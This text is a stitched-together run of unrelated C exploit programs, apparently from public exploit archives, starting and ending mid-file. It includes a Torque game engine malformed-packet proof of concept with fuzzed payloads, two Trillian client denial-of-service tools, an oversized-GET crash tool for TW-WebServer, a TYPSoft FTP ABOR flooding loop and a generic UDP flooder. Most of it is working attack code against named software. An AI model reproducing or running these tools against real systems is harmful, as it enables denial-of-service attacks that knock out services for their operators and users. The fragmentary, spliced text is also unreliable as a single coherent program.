      MasterServerGameTypesRequest  = 2,
      MasterServerGameTypesResponse = 4,
      MasterServerListRequest       = 6,
      MasterServerListResponse      = 8,
      GameMasterInfoRequest         = 10,
      GameMasterInfoResponse        = 12,
      GamePingRequest               = 14,
      GamePingResponse              = 16,
      GameInfoRequest               = 18,
      GameInfoResponse              = 20,
      GameHeartbeat                 = 22,

      ConnectChallengeRequest       = 26,
      ConnectChallengeReject        = 28,
      ConnectChallengeResponse      = 30,
      ConnectRequest                = 32,
      ConnectReject                 = 34,
      ConnectAccept                 = 36,
      Disconnect                    = 38,
   };
enum NetPacketType
{
   DataPacket,
   PingPacket,
   AckPacket,
   InvalidPacketType,
};

// some pre-built names for testing this proof-of-concept with the
// example games and demos and various games (like Legends)
u8  *test_gamenames[] = {
    "Torque Game Engine Demo",
    "FPS Example",
    "PhysX",
    "3DRc",
    "Metal Drift",
    "",
    NULL
};



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            b,
            len,
            tg      = 0,
            bug;
    u16     port    = PORT;
    u8      buff[BUFFSZ],
            password[256] = "",
            digest[16],
            gamename_tmp[256] = "",
            *gamename,
            *host;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Torque game engine invalid memory access "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <bug> <host> [port(%hu)]>\n"
            "\n"
            "Bugs:\n"
            " 1 = invalid memory access through too much arguments\n"
            " 2 = possible vulnerability 1\n"
            " 3 = possible vulnerability 2\n"
            " 4 = possible vulnerability 3\n"
            " 5 = possible vulnerability 4\n"
            " 6 = possible vulnerability 5\n"
            "\n", argv[0], port);
        exit(1);
    }

    bug = atoi(argv[1]);
    host = argv[2];
    if(argc > 3) port = atoi(argv[3]);

    peer.sin_addr.s_addr  = resolv(host);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    gamename = test_gamenames[tg];
redo:
    sd = udp_sock();

    b = 0;
    b = write_bits(ConnectChallengeRequest, 8, buff, b);
    b = write_bits(0,    32, buff, b);      // connectSequence
    len = send_recv(sd, buff, PADDING(b)>>3, buff, BUFFSZ, &peer, 1);
    memcpy(digest, buff + 5, 16);

    b = 0;
    b = write_bits(ConnectRequest, 8, buff, b);
    b = write_bits(0,    32, buff, b);      // connectSequence
    b = write_bstr(buff,  b, digest, 16);   // addressDigest
    b = write_bstr(buff,  b, "GameConnection", -1); // connectionClass: GameConnection, MessageForwarder, Message, EventManager, UndoManager, FileDownloadRequestEvent and so on
    b = write_bits(0,    32, buff, b);      // classGroup
    b = write_bits(-1,   32, buff, b);      // classCRC
    b = write_bstr(buff,  b, gamename, -1); // gameString, it MUST match the one on the server!
    b = write_bits(9999, 32, buff, b);      // currentProtocol (12)
    b = write_bits(0,    32, buff, b);      // minProtocol (12)
    b = write_bstr(buff,  b, password, -1); // password
    if(bug == 1) {
        b = write_bits(-1,   32, buff, b);  // arguments (too big)
    } else {
        b = write_bits(1,    32, buff, b);  // arguments
    }
    b = write_bstr(buff,  b, "mynick", -1); // the first argument
    len = send_recv(sd, buff, PADDING(b)>>3, buff, BUFFSZ, &peer, 1);

    while((buff[0] == 0x26) && !buff[6]) {
        len = send_recv(sd, NULL, 0, buff, BUFFSZ, &peer, 1);
    }
    if(buff[0] == 0x22) {
        close(sd);  // need to change the socket
        if(buff[5] == 0x10) {
            gamename = NULL;
            if(test_gamenames[tg]) gamename = test_gamenames[++tg];
            if(!gamename) {
                printf("\n"
                    "- insert the gameString name for this game, if you don't know it open the game\n"
                    "  executable with a hex editor and search the string after CHR_PROTOCOL:\n"
                    "  ");
                fgetz(gamename_tmp, sizeof(gamename_tmp));
                gamename = gamename_tmp;
            }
            printf("\n- test gameString %s\n", gamename);
            goto redo;
            printf("\nError: invalid gameString name\n");
            exit(1);
        } else if(buff[5] == 0x18) {
            printf("\n- server protected by password, insert the keyword:\n  ");
            fgetz(password, sizeof(password));
            goto redo;
        } else if(buff[5] == 0x1a) {
            printf("\nError: server full, retry later\n");
            exit(1);
        //} else {
            //printf("\nError: player seems to have been not accepted (%02x %02x), I try to continue\n", buff[0], buff[5]);
            //exit(1);
        }
    }

    if(bug > 1) {
        sleep(ONESEC);  // needed?

        b = 0;
        b = write_bits(1,     1, buff, b);      // processRawPacket
        b = write_bits(0,     1, buff, b);      // pkConnectSeqBit
        b = write_bits(1,     9, buff, b);      // pkSequenceNumber
        b = write_bits(0,     9, buff, b);      // pkHighestAck
        b = write_bits(DataPacket, 2, buff, b); // pkPacketType
        b = write_bits(0,     3, buff, b);      // pkAckByteCount
        //b = write_bits(-1,  8*4, buff, b);      // pkAckMask (pkAckByteCount * 4)

        // oh yeah, fuzzing makes miracles moreover with an engine of a similar complexity
        if(bug == 2) {
            b = write_bstr(buff,  b,
                "\x4c\x6f\xbb\xc9\xb4\x53\xe5\x8a\x92\x86\x98\xfd\x66\xc8\x35\x92"
                "\x86\x18\x3d\x86\x18\xbd\x46\x78\xad\x5e\xd4\xa3\x6d\xbe\xc4\xbb"
                "\xc9\xb4\x53\xe5\x8a\x12\x46\x78\x2d\x1e\xb4\xd3\xa5\xea\x82\x9e"
                "\x74\xb3\x55\x62\xce\xac\x5f\xd3\x25\xaa\x62\xce\xac\x5f\x53\xe5"
                "\x0a\xd2\x26\xa8\x65\x4a\x72\xb6\x50\xe9\x04\xdb\x19\xbc\xc7\x37"
                "\x8f\x0b\x51\x68\xc5\x3a\x0a\x52\x66\xc8\xb5\xd2\x26\x28\xa5\x6a"
                "\xc2\x3e\x04\xdb\x99\xfc\x67\xc7\x37\x8f\x0b\xd1\xa8\x65\x4a\x72"
                "\xb6\x50\x69\x44\x7b\x29\xa4\x6b\x41\x80\x21\xb0\x59\x5c\xd7\x9f", 128);
        } else if((bug == 3) || (bug == 4)) {
            b = write_bstr(buff,  b,
                "\x44\x7b\x29\x24\x2b\x21\x30\x99\x7c\x27\x27\x27\x27\x27\xa7\xe7"
                "\x07\x57\x5f\x53\xe5\x0a\x52\xe6\x88\x95\x02\x5e\x54\x63\xcd\x2e"
                "\x9c\xf7\x6f\x3b\x09\x54\x63\xcd\xae\x5c\xd7\x1f\x33\x95\x82\x9e"
                "\xf4\x73\xb5\xd2\xa6\x68\xc5\xba\x4a\xf2\x76\xb0\xd9\x1c\x37\x0f"
                "\xcb\x31\x98\xfd\x66\x48\x75\x32\x96\x00\x61\x50\xe9\x04\x5b\xd9"
                "\x9c\xf7\x6f\x3b\x09\xd4\xa3\x6d\x3e\x04\xdb\x99\xfc\xe7\x87\x97"
                "\xff\x63\xcd\x2e\x9c\xf7\xef\xfb\x69\x44\x7b\x29\xa4\xeb\x81\x20"
                "\x31\x98\xfd\xe6\x08\x55\xe2\x0e\xcc\xaf\x5b\xd9\x9c\x77\x2f\x1b",
                (bug == 3) ? 90 : 120);
        } else if(bug == 5) {
            b = write_bstr(buff,  b,
                "\xfe\xe4\x8b\x91\x08\x55\x62\x4e\x6c\xbf\x43\x7d\xa6\x68\xc5\xba"
                "\xca\xb2\xd6\xa0\xf1\xf8\x6d\xbe\xc4\xbb\xc9\xb4\xd3\x25\x2a\xa2"
                "\x6e\x3c\x87\x97\xff\xe3\x0d\xce\x2c\x9f\xf3\xf5\xf2\xf6\x70\x39"
                "\x8c\x8f\x8b\x91\x08\x55\x62\xce\xac\x5f\x53\x65\x4a\xf2\x76\x30"
                "\x19\x3c\x87\x97\xff\x63\xcd\xae\x5c\x57\x5f\xd3\x25\x2a\x22\x2e"
                "\x1c\x37\x0f\xcb\xb1\xd8\x9d\x76\xb0\x59\xdc\x97\x7f\x23\xad\xde"
                "\x14\xc3\x3d\x06\x58\x5d\xd6\x20\x31\x98\xfd\x66\x48\x75\xb2\x56"
                "\xe0\x11\xc8\xb5\x52\xe6\x88\x95\x82\x9e\x74\xb3\x55\xe2\x8e\x0c"
                "\xcf\x2b\x21\xb0\x59\x5c\x57\xdf\x93\x05\xda\x1a\xba\x4a\x72\xb6"
                "\x50\xe9\x04\x5b\x59\xdc\x97\x7f\x23\xad\xde\x14\x43\xfd\xe6\x88"
                "\x15\x42\xfe\x64\xcb\x31\x18\xbd\x46\xf8\xed\xfe\xe4\x0b\x51\x68"
                "\x45\x7a\x2a\xa2\x6e\x3c\x07\xd7\x9f\xf3\x75\xb2\x56\xe0\x11\x48"
                "\x75\x32\x96\x00\xe1\x90\x09\x54\x63\xcd\x2e\x1c\xb7\x4f\xeb\x81"
                "\xa0\x71\xb8\xcd\xae\x5c\x57\x5f\xd3\x25\x2a\xa2\xee\xfc\xe7\x87"
                "\x97\xff\x63\x4d\x6e\xbc\x47\xf7\xef\xfb\x69\xc4\x3b\x89\x94\x83"
                "\x9d\xf6\xf0\xf9\xec\xff\xe3\x8d\x0e\x4c\x6f\x3b\x89\x94\x83\x1d"
                "\x36\x10\x49\x74\xb3\xd5\xa2\xee\xfc\xe7\x07\x57\xdf\x93\x85\x9a"
                "\x7a\x2a\x22\x2e\x9c\xf7\xef\x7b\x29\x24\x2b\x21\x30\x99\x7c\x27"
                "\xa7\x67\xc7\xb7\xcf\xab\xe1\x90", 296);
        } else if(bug == 6) {
            b = write_bstr(buff,  b,
                "\x8c\x8f\x8b\x91\x08\x55\x62\x4e\xec\xff\x63\x4d\xee\x7c\x27\x27"
                "\x27\xa7\x67\x47\xf7\x6f\xbb\xc9\x34\x93\x05\x5a\xda\x1a\x3a\x8a"
                "\x12\xc6\x38\x0d\xce\x2c\x9f\x73\xb5\xd2\x26\xa8\x65\xca\x32\x16", 40);
        } else {
            printf("\nError: invalid bug number (%d)\n", bug);
            exit(1);
        }
        len = send_recv(sd, buff, PADDING(b)>>3, NULL, 0, &peer, 0);
        len = send_recv(sd, buff, PADDING(b)>>3, NULL, 0, &peer, 0);    // mah 2 times

        sleep(ONESEC);  // needed
    }

    /* disconnection packet, not needed
    b = 0;
    b = write_bits(Disconnect, 8, buff, b);
    b = write_bits(0,    32, buff, b);      // connectSequence
    b = write_bstr(buff,  b, "no reason to quit", -1);
    len = send_recv(sd, buff, PADDING(b)>>3, buff, BUFFSZ, &peer, 1);
    */

    printf("\n- done\n");
    close(sd);
    return(0);
}



void fgetz(u8 *data, int len) {
    u8      *p;
    fgets(data, len, stdin);
    for(p = data; *p && (*p != '\r') && (*p != '\n'); p++);
    *p = 0;
}



int write_bstr(u8 *data, int b, u8 *str, int len) {
    int     i;

    if(len < 0) {   // for the strings use the writeString method
        len = strlen(str);
        b = write_bits(0,   1, data, b);    // huffman compression
        b = write_bits(len, 8, data, b);    // string length
    }
    for(i = 0; i < len; i++) {
        b = write_bits(str[i], 8, data, b);
    }
    return(b);
}



int udp_sock(void) {
    struct  linger  ling = {1,1};
    int     sd;

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    setsockopt(sd, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));
    return(sd);
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err) {
    int     retry,
            len;

    if(in && !out) {
        fputc('.', stdout);
        if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
          < 0) goto quit;
        return(0);
    }
    if(in) {
        for(retry = 2; retry; retry--) {
            fputc('.', stdout);
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
              < 0) goto quit;
            if(!timeout(sd, 1)) break;
        }

        if(!retry) {
            if(!err) return(-1);
            printf("\nError: socket timeout, no reply received\n\n");
            exit(1);
        }
    } else {
        if(timeout(sd, 3) < 0) return(-1);
    }

    fputc('.', stdout);
    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) goto quit;
    return(len);
quit:
    if(err) std_err();
    return(-1);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


source: http://www.securityfocus.com/bid/5776/info

A vulnerability has been reported for Trillian. Reportedly, Trillian is prone to a denial of service condition when certain it receives messages about a user leaving a non-specified channel or a channel that the user is not currently in.

It is possible to exploit this issue via a malicious server.

/* Trillian-Dos.c
   Author: Lance Fitz-Herbert
   Contact: IRC: Phrizer, DALnet - #KORP
            ICQ: 23549284

   Exploits Multiple Trillian DoS Flaws:
      Raws 206, 211, 213, 214, 215, 217, 218, 243, 302, 317, 324, 332, 333,
352, 367
      Part Flaw
      Data length flaw.

   Tested On Version .74
   Compiles with Borland 5.5 Commandline Tools.

   These Examples Will Just DoS The Trillian Client,
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <winsock.h>

SOCKET s;

#define SERVER ":server "
#define PART ":nick!ident@address PART\n"

int main(int argc, char *argv[]) {
		 SOCKET TempSock = SOCKET_ERROR;
		 WSADATA WsaDat;
		 SOCKADDR_IN Sockaddr;
		 int nRet;
		 char payload[4096];
		 if (argc < 2) {
		 		 usage();
		 		 return 1;
		 }
		 if ((!strcmp(argv[1],"raw")) && (argc < 3) || (strcmp(argv[1],"raw")) &&
(strcmp(argv[1],"part")) && (strcmp(argv[1],"data"))) {
		 		 usage();
		 		 return 1;
		 }

		 printf("Listening on port 6667 for connections....\n");
		 if (WSAStartup(MAKEWORD(1, 1), &WsaDat) != 0) {
        		 printf("ERROR: WSA Initialization failed.");
		 		 return 0;
		 }


		 /* Create Socket */
		 s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		 if (s == INVALID_SOCKET) {
		 		 printf("ERROR: Could Not Create Socket. Exiting\n");
		 		 WSACleanup();
		 		 return 0;
		 }

		 Sockaddr.sin_port = htons(6667);
		 Sockaddr.sin_family = AF_INET;
		 Sockaddr.sin_addr.s_addr  = INADDR_ANY;


        nRet = bind(s, (LPSOCKADDR)&Sockaddr, sizeof(struct sockaddr));
		 if (nRet == SOCKET_ERROR) {
		 		 printf("ERROR Binding Socket");
		 		 WSACleanup();
		 		 return 0;
		 }

		 /* Make Socket Listen */
		 if (listen(s, 10) == SOCKET_ERROR) {
		 		 printf("ERROR: Couldnt Make Listening Socket\n");
		 		 WSACleanup();
		 		 return 0;
		 }

		 while (TempSock == SOCKET_ERROR) {
		       TempSock = accept(s, NULL, NULL);
		 }

		 printf("Client Connected, Sending Payload\n");


		 if (!strcmp(argv[1],"part")) {
		 		 send(TempSock,PART,strlen(PART),0);
		 }
		 if (!strcmp(argv[1],"raw")) {
		 		 send(TempSock,SERVER,strlen(SERVER),0);
		 		 send(TempSock,argv[2],strlen(argv[2]),0);
		 		 send(TempSock,"\n",1,0);
		 }
		 if (!strcmp(argv[1],"data")) {
		 		 memset(payload,'A',4096);
		 		 send(TempSock,payload,strlen(payload),0);
		 }
		 printf("Exiting\n");
		 sleep(100);
		 WSACleanup();
		 return 0;
}

usage() {
		 		 printf("\nTrillian Multiple DoS Flaws\n");
		 		 printf("---------------------------\n");
		 		 printf("Coded By Lance Fitz-Herbert (Phrizer, DALnet/#KORP)\n");
		 		 printf("Tested On Version .74\n\n");
		 		 printf("Usage: Trillian-Dos <type> [num]\n");
		 		 printf("Type: raw, part, data\n");
		 		 printf("Num : 206, 211, 213, 214, 215, 217, 218, 243, 302, 317, 324, 332,
333, 352, 367\n\n");
}/*

[--------------------------------------------]
[:::::::::::::::::: trillian 0.7*(d patch)   ]
[:::::Denial:of:Service::simple:exploit::]
[-----------------------------[l0bstah]-----]
[usage ::                                           ]
[      : trillah name attacked-nick          ]
[                                                       ]
[comment:: after patch .74d, exploits,  ]
[         wich use damage (~4095 data)  ]
[         not work, but this exploit           ]
[         work at any patch.                    ]
[                                                       ]
[P.S. irc specification include rull:          ]
[510 characters maximum allowed for   ]
[the command and its parameters...     ]
[that is why szBuf has 570 length...       ]
[--------------------------------------------]

*/

 #include <winsock.h>
 #include <iostream.h>
 #include <stdio.h>
 #include <dos.h>

 #define port    4384
 #define bfsize  540
 #define rptimes 1000

 WSADATA     wsadata;
 SOCKADDR_IN sa;
 SOCKET      s;
 LPHOSTENT   lpHostEntry;
 int         SockAddr = sizeof(struct sockaddr);
 int         i, ports;
 char        szBuf[570];          // [damage data] 
 char        nick[50];            // <NICK> command 
 char        user[50];            // <USER> command 
 char        mode[50];            // <MODE> command 
 char        *cname = "trillah";  // your client name


int main(int argc, char **argv)
 {

   printf("::::::::::::::::::::::::::::::::::::\n");
   printf(": trillah - remote DoS exploit :::::\n");
   printf(":::::::::::::::::::::::::::[l0bstah]\n");

   if (argc < 3) 
   { printf("use: trillah dnsname nick\n"); return 0; }
   
   char *addr=argv[1];
   ports=port;

   if (WSAStartup(0x0101,&wsadata) == 0)
   {

        lpHostEntry = gethostbyname(addr);

        sa.sin_family = AF_INET;
        sa.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list);
        sa.sin_port = htons(ports);

        if ((s=socket(AF_INET,SOCK_STREAM,0)) == INVALID_SOCKET)
        {
        printf("Can't open socket! - #%d\n",WSAGetLastError());
        exit(0);
        }

        printf("connecting to irc server : %s...\n", addr);

        if (connect(s, (struct sockaddr*)&sa, sizeof(sa)) == -1)
        {
        printf("Can't connect() - #%d\n",WSAGetLastError());
        exit(0);
        }       
        printf("connected... starting login session \n\n");

        //*** NICK <NICK>
        strcpy(nick, "NICK ");
        strcat(nick, cname);
        strcat(nick, "\n");
        send(s,
                nick,
                strlen(nick),
                0);

        printf(nick);

        //*** USER <mode> <unused> <realname>
        strcpy(user, "USER ");
        strcat(user, cname);
        strcat(user, " 0 127.0.0.1 : trilla\n");
        send(s,
                user,
                strlen(user),
                0);

        printf(user);

        sleep(1);

        //*** MODE <nick> (+|-*)
        strcpy(mode, "MODE ");
        strcat(mode, cname);
        strcat(mode, " +i\n");
        send(s,
                mode,
                strlen(mode),
                0);

        sleep(2);

        //**********DAMAGE****DATA*************//

        printf("Sending damage data...\n");
        strcat(szBuf, "NOTICE ");
        strcat(szBuf, argv[2]);
        strcat(szBuf, " :");
        for(i=0;i<=bfsize;i++) strcat(szBuf,"A");
        strcat(szBuf, "\n");


        for (i=0;i<=rptimes;i++)
        {

        send(s,
            szBuf,
            strlen(szBuf),
            0);
        }


        printf("attack complete....");

        //*************************************//

        closesocket(s);
        
        }

  WSACleanup();

}

// milw0rm.com [2003-08-01]
source: http://www.securityfocus.com/bid/7368/info
 
It has been reported that TW-WebServer is prone to a denial of service vulnerability. Reportedly when an excessive quantity of data is sent to the TW-Webserver as part of a malicious HTTP GET request the server will fail.
 
Although unconfirmed, due to the nature of this vulnerability, an attacker may have the ability to supply and execute arbitrary code. 

/*
    
 >> by Shashank pandey
  
  

 >>http://geekgroove.8m.com
 Twilight Utilities TW-WebServer/1,3,2,0 
#
# Vulnerable systems:
# TW-WebServer/1, 3, 2, 0
#
  
*/
#include <windows.h>
#include <winsock.h>
#include <stdio.h>
#pragma comment (lib,"ws2_32")
void graphitte()
{printf("\n---------------------------------- ");
 printf("\nTW-WebServer/1, 3, 2, 0 DoS tool  |  \n");
 printf("--------------------------------- |\n");
 printf("      by Shashank Pandey          |\n");
 printf("(reach_shash@linuxmail.org)       |\n"); 
 printf("---------------------------------- \n");
 
}
int main(int argc, char *argv[])
{
     
  WSADATA wsaData;
      
      
      
      
      int s;
  
  char trash[100];
  
struct hostent *yo;
   struct sockaddr_in heck;
  char buffer[4096] ="";
      char myrequest[5000];    
      
  
  
  graphitte();
       
     
    
if(WSAStartup(0x0101,&wsaData)!=0) {
      printf("Error :Cudn't initiate winsock!");
      return 0;
      }
if(argc<2)
{printf("Usage : %s I.P/Hostname\n\n",argv[0]);
  exit(0);}
  if ( (yo = gethostbyname(argv[1]))==0)
  {
    printf("error: can't resolve '%s'",argv[1]);
    return 1;
  }
printf("\nChecking web server %s\n",argv[1]);
      
   
  heck.sin_port = htons(80);
  heck.sin_family = AF_INET;
  heck.sin_addr = *((struct in_addr *)yo->h_addr);
  if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1){
    printf("error: can't create socket");
    return 1;
  }
  
  if ((connect(s, (struct sockaddr *) &heck, sizeof(heck))) == -1){
    printf("Error:Cudn't Connect\r\n");
    return 1;
  }
 
  
  
buffer[sizeof(buffer)]=0x00;
  memset(buffer,'S',sizeof(buffer));
  memset(myrequest,0,sizeof(myrequest));
      memset(trash,0,sizeof(trash));
      sprintf(myrequest,"GET %s HTTP/1.0\r\n\r\n",buffer);
      
      printf("\r\nTrying oveflow request... ");
      send(s,myrequest,strlen(myrequest),0);
      
      printf("Evil Request SENT\r\n");
      recv(s,trash,sizeof(trash),0);
      if(trash[0]==0x00) 
  {
      printf("Server Crashed :-) !.\r\n");
  
       
      } 
  
  else
      
  
  printf("Server is prolly patched.\r\n");
      
  closesocket(s);
  



WSACleanup();
    


}
/*
 Soft   :  TYPSoft FTP Server
 Version:  1.11

 Denial of Service in TYPSoft FTP Server up to 1.11 (no crash)
 Just the server is saturated, it stops responding.

 --------------------------------------------------------------------------------------
 The vulnerability is caused due to an error in handling the request (ABOR).
 This can be exploited to satured the FTP service, and make the server inaccessible 
 for several days.
 --------------------------------------------------------------------------------------

 Author	: Jonathan Salwan
 Mail	: submit AT shell-storm.org
 Web	: http://www.shell-storm.org
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int syntax(char *file)
	{
	fprintf(stderr,"TYPSoft FTP Server Remote Denial of Service\n");
	fprintf(stderr,"=>Syntax : <%s> <ip> <port> <user> <pass>\n",file);
	fprintf(stderr,"         : %s 127.0.0.1 21 anonymous aaa\n",file);
	exit(0);
	}

int main(int argc, char **argv)
{
	if (argc < 2)
		syntax(argv[0]);
	
	int port = atoi(argv[2]);

	int mysocket;
	int mysocket2;
	int srv_connect;
	int sockaddr_long;


		struct sockaddr_in sockaddr_mysocket;
		sockaddr_long = sizeof(sockaddr_mysocket);
		sockaddr_mysocket.sin_family = AF_INET;
		sockaddr_mysocket.sin_addr.s_addr = inet_addr(argv[1]);
		sockaddr_mysocket.sin_port = htons(port);

        char request[200];
	char answer[500];

        fprintf(stdout,"[+]TYPSoft FTP Server %s\n",argv[1]);

                mysocket2 = socket(AF_INET, SOCK_STREAM, 0);
                        if(mysocket2 == -1){
			return 1;}

	srv_connect = connect(mysocket2, (struct sockaddr*)&sockaddr_mysocket, sockaddr_long);
	
	if (srv_connect != -1)
 		{	
		recv(mysocket2,answer,sizeof(answer),0);

		fprintf(stdout,"[+]Connexion\t\t[OK]\n");
		
		sprintf(request, "USER %s\r\n", argv[3]);
		
			if (send(mysocket2,request,sizeof(request),0) == -1){
				fprintf(stderr,"[-]Send Request User\t\t[FAILED]\n");
				shutdown(mysocket2,1);
				return 1;}
			fprintf(stdout,"[+]USER request\t\t[OK]\n");
                
		sprintf(request, "PASS %s\r\n", argv[4]);

                        if (send(mysocket2,request,sizeof(request),0) == -1){
                                fprintf(stderr,"[-]Send Request PASS\t\t[FAILED]\n");
                                shutdown(mysocket2,1);
                                return 1;}
			fprintf(stdout,"[+]PASS request\t\t[OK]\n");

                sprintf(request, "ABOR\r\n");

	fprintf(stdout,"[+]If exploit is active, the server is saturated, it stops responding...\n");

		while(1){
                        if (send(mysocket2,request,sizeof(request),0) == -1){
                                fprintf(stderr,"[-]Send Request ABOR\t\t[FAILED]\n");
                                shutdown(mysocket2,1);
                                return 1;}
			}

		}
		else{
			fprintf(stderr,"[-]Connect\t\t[FAILED]\n");
			shutdown(mysocket2,1);
			return 1;}

	shutdown(mysocket2,1);

return 0;
}

// milw0rm.com [2009-05-11]
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#define shit "BLEAHD"

time_t elapsed;
long sendcount = 0, kbs;

void stats(int signum)
{
	kbs = (sendcount*6)/(time(0)-elapsed)/1024; // i dont think this is right but...
	printf("\npid: %d, ran for %u seconds\n",getpid(),(time(0) - elapsed));
	printf("%u packets out, total: %u Kb/s\n",sendcount,kbs);
	printf("aborting due to signal %d\n",signum);
	exit(32+signum);
}

void
usage(char *pname) {
 printf("raped.c by cys of NewNet\n");
 printf("Usage: %s dest[ip] x[0=flood] port[0=rand] delay(ms)[0=none]\n",pname);
 exit(-1);
}

int main(int argc, char **argv)
{
	struct sockaddr_in sin;
	int port, amount, i, s;
	elapsed = time(0);
	{int n;for (n=1;n<32;n++) signal(n,stats);}
	if(argc < 5)
		usage(argv[0]);
    
	if (atoi(argv[2]) != 0) { 
		amount = atoi(argv[2]); 
	} else { 
		amount = 0; 
	} 
 
	if(atoi(argv[3]) == 0)
	{
		srand((unsigned int)time(NULL));
		port = rand() % 65535;
	} else {
		if(atoi(argv[3]) < 1 || atoi(argv[3]) > 65535)
		{
			printf("Port must be over 1 and under 65535\n");
			exit(-1);
		} else {
			port = atoi(argv[3]);
		}
	}

	sin.sin_family=AF_INET;
	sin.sin_addr.s_addr=inet_addr(argv[1]);
	sin.sin_port=htons(port);
	s = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
	connect(s,(struct sockaddr *)&sin,sizeof(sin)); // connect in udp? il just leave it..
	printf("raped2.c by cys of NewNet\n");
	if(amount == 0) {
		printf("ip:%s x:0 port:%d delay:%d\n",argv[1],port,atoi(argv[4]));
		for(;;) {
			send(s,shit,50,0);
			sendcount++;
			if(atoi(argv[4])!=0) usleep(atoi(argv[4]));
		}
	} else {
		printf("ip:%s x:%d port:%d delay:%d\n",argv[1],amount,port,atoi(argv[4]));
		for(i=0;i<amount;i++){
			send(s,shit,50,0); 
			sendcount++;
			if(atoi(argv[4])!=0) usleep(atoi(argv[4]));
		}
	}
	printf("Exiting...\n");
}


// milw0rm.com [2002-09-10]
/*
    Copyright 2006-2011 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl-2.0.txt
*/

// gcc -o udpsz udpsz.c md5.c -lz -ldl
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <sys/stat.h>
#include <time.h>
#include <ctype.h>
#include <zlib.h>       // -lz
//#include "show_dump.h"

#ifdef WIN32
    #include <winsock.h>
    #include <tlhelp32.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define sleepms sleep
    #define ONESEC  1000
    #define LOADDLL         hLib = LoadLibrary(fname); \
                            if(!hLib) winerr();
    #define GETFUNC(x,y)    x = (void *)GetProcAddress(hLib, y); \
                            if(!quiet) printf("  %-10s %p\n", y, x);
                            //if(!x) winerr();
    #define CLOSEDLL        FreeLibrary(hLib);
    #define set_priority    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS)
    HINSTANCE   hLib    = NULL;
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
    #include <dlfcn.h>      // -ldl

    #define stricmp strcasecmp
    #define stristr strcasestr
    #define sleepms(X)  usleep(X * 1000)
    #define ONESEC  1
    #define LOADDLL         hLib = dlopen(fname, RTLD_LAZY); \
                            if(!hLib) { \
                                fprintf(stderr, "\nError: %s\n\n", dlerror()); \
                                exit(1); \
                            }
    #define GETFUNC(x,y)    x = (void *)dlsym(hLib, y); \
                            if(!quiet) printf("  %-10s %08x\n", y, (uint32_t)x);
                            //error = dlerror();
                            //if(error || !x) { // no checks!
                                //fprintf(stderr, "\nError: %s\n\n", error);
                                //exit(1);
    #define CLOSEDLL        dlclose(hLib);
    void        *hLib   = NULL;
    #define __cdecl
    typedef uint32_t DWORD;
    typedef char DEBUG_EVENT;
#endif

#ifdef WIN32
    #define quick_thread(NAME, ARG) DWORD WINAPI NAME(ARG)
    #define thread_id   HANDLE
#else
    #define quick_thread(NAME, ARG) void *NAME(ARG)
    #define thread_id   pthread_t
#endif

thread_id quick_threadx(void *func, void *data) {
    thread_id   tid;
#ifdef WIN32
    DWORD   tmp;

    tid = CreateThread(NULL, 0, func, data, 0, &tmp);
    if(!tid) return(0);
#else
    if(pthread_create(&tid, NULL, func, data)) return(0);
#endif
    return(tid);
}

void quick_threadz(thread_id tid) {
#ifdef WIN32
    DWORD   ret;

    for(;;) {
        if(!GetExitCodeThread(tid, &ret)) break;
        if(!ret) break;
        Sleep(100);
    }
#else
    pthread_join(tid, NULL);
#endif
}

typedef uint8_t     u8;
